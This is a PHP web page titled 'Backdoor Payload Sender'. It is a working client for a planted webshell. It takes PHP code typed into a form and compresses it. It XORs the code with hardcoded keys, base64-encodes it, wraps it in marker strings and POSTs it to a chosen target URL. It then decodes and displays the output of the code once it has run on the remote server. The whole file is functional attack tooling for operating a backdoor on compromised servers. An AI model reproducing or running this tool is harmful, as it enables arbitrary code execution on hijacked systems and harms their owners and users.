<?php

// --- CONFIGURE ---
$default_target_url = 'http://localhost/index.php'; // Default value
$key = "3b712de4";
$kh = "8137572f3849";
$kf = "aabd5666a4e3";
$p = "wowzoun0lxqf0Qwj";

// --- XOR FUNCTION ---
function xor_string($data, $key) {
    $output = '';
    $dataLen = strlen($data);
    $keyLen = strlen($key);
    for ($i = 0; $i < $dataLen; $i++) {
        $output .= $data[$i] ^ $key[$i % $keyLen];
    }
    return $output;
}

// --- FORM HANDLER ---
$output = '';
$output_e = '';
$display_mode = isset($_POST['display_mode']) ? $_POST['display_mode'] : 'text';
$target_url = isset($_POST['target_url']) ? $_POST['target_url'] : $default_target_url;
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['php_code'])) {
    $php_code = $_POST['php_code'];

    // Encode payload
    $compressed = gzcompress($php_code);
    $xored = xor_string($compressed, $key);
    $encoded = base64_encode($xored);
    $payload = $kh . $encoded . $kf;

    // Send payload
    $options = [
        'http' => [
            'method'  => 'POST',
            'header'  => "Content-Type: text/plain\r\n",
            'content' => $payload,
        ]
    ];
    $context  = stream_context_create($options);
    try {
        $response = @file_get_contents($target_url, false, $context);
        if ($response === false) {
            $error = error_get_last();
            $output_e = "Error sending payload: " . ($error['message'] ?? 'Unknown error');
        }
    } catch (Exception $e) {
        $output_e = "Exception: " . $e->getMessage();
    }

    // Extract and decode output
    if (preg_match("/$p$kh(.+)$kf/s", $response, $m)) {
        $resp_encoded = $m[1];
        $resp_xored = base64_decode($resp_encoded);
        $resp_decompressed = @gzuncompress(xor_string($resp_xored, $key));
        if ($display_mode === 'html') {
            $output = $resp_decompressed;
        } else {
            $output = htmlspecialchars($resp_decompressed);
        }
    } else {
        $output = "No valid response received.";
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Backdoor Payload Sender</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <!-- Google Fonts for modern look -->
    <link href="https://fonts.googleapis.com/css?family=Roboto:400,700&display=swap" rel="stylesheet">
    <style>
        body {
            background: #f4f6f8;
            font-family: 'Roboto', Arial, sans-serif;
            margin: 0;
            padding: 0;
        }
        .container {
            max-width: 650px;
            margin: 40px auto;
            background: #fff;
            border-radius: 14px;
            box-shadow: 0 4px 24px rgba(0,0,0,0.09);
            padding: 32px 36px 28px 36px;
        }
        h2 {
            margin-top: 0;
            color: #22223b;
            font-weight: 700;
            letter-spacing: 1px;
        }
        label {
            font-weight: 500;
            color: #22223b;
            margin-bottom: 8px;
            display: block;
        }
        input[type="text"] {
            width: 100%;
            padding: 10px 12px;
            border: 1px solid #c9c9c9;
            border-radius: 6px;
            font-size: 1rem;
            margin-bottom: 18px;
            margin-top: 4px;
            background: #f8f9fa;
            transition: border 0.2s;
        }
        input[type="text"]:focus {
            border: 1.5px solid #4f8cff;
            outline: none;
        }
        textarea {
            width: 100%;
            min-height: 120px;
            padding: 12px;
            border: 1px solid #c9c9c9;
            border-radius: 6px;
            font-size: 1rem;
            background: #f8f9fa;
            margin-bottom: 18px;
            resize: vertical;
            transition: border 0.2s;
        }
        textarea:focus {
            border: 1.5px solid #4f8cff;
            outline: none;
        }
        .radio-group {
            margin-bottom: 18px;
        }
        .radio-group label {
            display: inline-block;
            margin-right: 18px;
            font-weight: 400;
        }
        button[type="submit"] {
            background: linear-gradient(90deg, #4f8cff 0%, #38b6ff 100%);
            color: #fff;
            border: none;
            border-radius: 6px;
            padding: 12px 32px;
            font-size: 1.1rem;
            font-weight: 700;
            cursor: pointer;
            box-shadow: 0 2px 8px rgba(79,140,255,0.08);
            transition: background 0.2s;
        }
        button[type="submit"]:hover {
            background: linear-gradient(90deg, #38b6ff 0%, #4f8cff 100%);
        }
        .output-block {
            margin-top: 32px;
            background: #f8f9fa;
            border-radius: 8px;
            padding: 18px 18px 10px 18px;
            box-shadow: 0 2px 8px rgba(0,0,0,0.04);
        }
        .output-block h3 {
            margin-top: 0;
            color: #22223b;
            font-size: 1.1rem;
            font-weight: 700;
        }
        pre {
            border: thin solid #232946;
            color: #eaeaea;
            border-radius: 6px;
            padding: 14px;
            font-size: 1rem;
            overflow-x: auto;
            margin-bottom: 0;
        }
        .error {
            color: #d7263d;
            font-weight: 500;
            margin-top: 10px;
        }
        @media (max-width: 700px) {
            .container {
                padding: 18px 8px 18px 8px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>Backdoor Payload Sender</h2>
        <form method="post" autocomplete="off">
            <label for="target_url">Target URL:</label>
            <input type="text" id="target_url" name="target_url" value="<?php echo htmlspecialchars($target_url); ?>" required>

            <label for="php_code">PHP Code to Execute:</label>
            <textarea id="php_code" name="php_code" placeholder="Enter PHP code here" required><?php
                if (isset($_POST['php_code'])) echo htmlspecialchars($_POST['php_code']);
            ?></textarea>

            <div class="radio-group">
                <label>
                    <input type="radio" name="display_mode" value="text" <?php if ($display_mode === 'text') echo 'checked'; ?>>
                    Show as Text
                </label>
                <label>
                    <input type="radio" name="display_mode" value="html" <?php if ($display_mode === 'html') echo 'checked'; ?>>
                    Show as HTML
                </label>
            </div>
            <button type="submit">Send &amp; Get Output</button>
        </form>

        <?php if ($output !== '' || $output_e !== ''): ?>
            <div class="output-block">
                <h3>Output:</h3>
                <pre><?php echo $output; ?></pre>
                <?php if ($output_e !== ''): ?>
                    <div class="error"><?php echo htmlspecialchars($output_e); ?></div>
                <?php endif; ?>
            </div>
        <?php endif; ?>
    </div>
</body>
</html>